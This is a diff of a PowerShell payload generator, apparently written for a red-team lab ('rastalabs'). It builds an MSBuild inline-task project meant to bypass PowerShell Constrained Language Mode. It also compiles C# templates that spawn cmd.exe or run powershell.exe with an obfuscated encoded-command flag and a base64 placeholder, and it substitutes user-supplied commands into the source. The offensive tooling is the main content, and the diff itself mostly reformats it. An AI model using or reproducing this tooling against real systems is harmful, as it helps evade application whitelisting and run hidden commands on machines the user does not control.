@@ -51,42 +51,24 @@ param
 
 begin
 {
-$global:csproj = @"
+    $global:csproj = @"
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="Oops">
-   <ByClm/>
-  </Target>
-   <UsingTask
-    TaskName="ByClm"
-    TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-     <Task>
-      <Reference Include="System.Management.Automation" />		
-      <Code Type="Class" Language="cs">
-      <![CDATA[
-		using System;
-        using System.Collections.Generic;
-        using System.Linq;
-        using System.Text;
-        using System.Management.Automation;
-        
-        namespace Oops
-        {
-	        class Oops
-	        {
-		        static void Main(string[] args)
-		        {
-			        //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:System.Management.Automation.dll /platform:x64 /t:exe /unsafe /out:\rastalabs\payloads\oops.exe C:\rastalabs\payloads\oops.cs
-			        PowerShell ps = PowerShell.Create().AddCommand("cmd.exe").AddParameter("/c", "start").AddParameter("cmd.exe","");
-			        ps.Invoke();
-		        }
-	        }
-        }
-      ]]>
-
-      </Code>
-    </Task>
-  </UsingTask>
+<Target Name="Oops">
+<ByClm/>
+</Target>
+<UsingTask
+TaskName="ByClm"
+TaskFactory="CodeTaskFactory"
+AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+<Task>
+<Reference Include="System.Management.Automation" />		
+<Code Type="Class" Language="cs">
+<![CDATA[
+$global:exesrc
+]]>
+</Code>
+</Task>
+</UsingTask>
 </Project>
 "@
 
@@ -150,51 +132,51 @@ begin
 
 
     $global:dllsrc = @"
-        using System;
-        using System.Collections.Generic;
-        using System.Linq;
-        using System.Text;
-        using System.Management.Automation;
-        
-        
-        namespace Oopsnamespace
-        {
-    	    public class Oopsclass
-    	    {
-    		    public static void Main()
-		        {
-		        }
-		        public class Code
-		        {
-        			public static void Exec()
-			        {
-        				PowerShell ps = PowerShell.Create().AddCommand("powershell.exe").AddParameter("([char]45+[char]101+[char]99)", "{BASE64COMMAND}");
-				        ps.Invoke();
-			        }
-		        }
-	        }
-        }
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Management.Automation;
+
+
+namespace Oopsnamespace
+{
+	public class Oopsclass
+	{
+		public static void Main()
+        	{
+        	}
+        	public class Code
+        	{
+			public static void Exec()
+	        	{
+				PowerShell ps = PowerShell.Create().AddCommand("powershell.exe").AddParameter("([char]45+[char]101+[char]99)", "{BASE64COMMAND}");
+		        	ps.Invoke();
+	        	}
+        	}
+    	}
+}
 "@
 
     $global:exesrc = @"
-        using System;
-        using System.Collections.Generic;
-        using System.Linq;
-        using System.Text;
-        using System.Management.Automation;
-        
-        namespace Oops
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Management.Automation;
+
+namespace Oops
+{
+    class Oops
+    {
+        static void Main(string[] args)
         {
-	        class Oops
-	        {
-		        static void Main(string[] args)
-		        {
-			        //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:System.Management.Automation.dll /platform:x64 /t:exe /unsafe /out:\rastalabs\payloads\oops.exe C:\rastalabs\payloads\oops.cs
-			        PowerShell ps = PowerShell.Create().AddCommand ("cmd.exe").AddParameter("/c", "start").AddParameter("cmd.exe","");
-			        ps.Invoke();
-		        }
-	        }
+	        #C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:System.Management.Automation.dll /platform:x64 /t:exe /unsafe /out:\rastalabs\payloads\oops.exe C:\rastalabs\payloads\oops.cs
+	        PowerShell ps = PowerShell.Create().AddCommand ("cmd.exe").AddParameter("/c", "start").AddParameter("cmd.exe","");
+	        ps.Invoke();
         }
+    }
+}
 "@
     $global:cscpath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
     $global:ilasm = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"
@@ -231,10 +213,10 @@ function Invoke-FileCreate {
     Write-Host $global:DllName
     Write-Host $global:Entry
     Write-Host $global:Command
-	$global:fin = $src.Replace("{PEPEGA}",$Command)
+    $global:fin = $src.Replace("{PEPEGA}",$Command)
     Write-Host $global:fin
     $global:fin2 = $global:fin.Replace("Exec",$Entry)
-	Write-Host $global:fin2
+    Write-Host $global:fin2
     $global:srcfile = $global:DllName + ".cs"
     $global:fin2 | Out-File $global:srcfile
     Invoke-DllMove
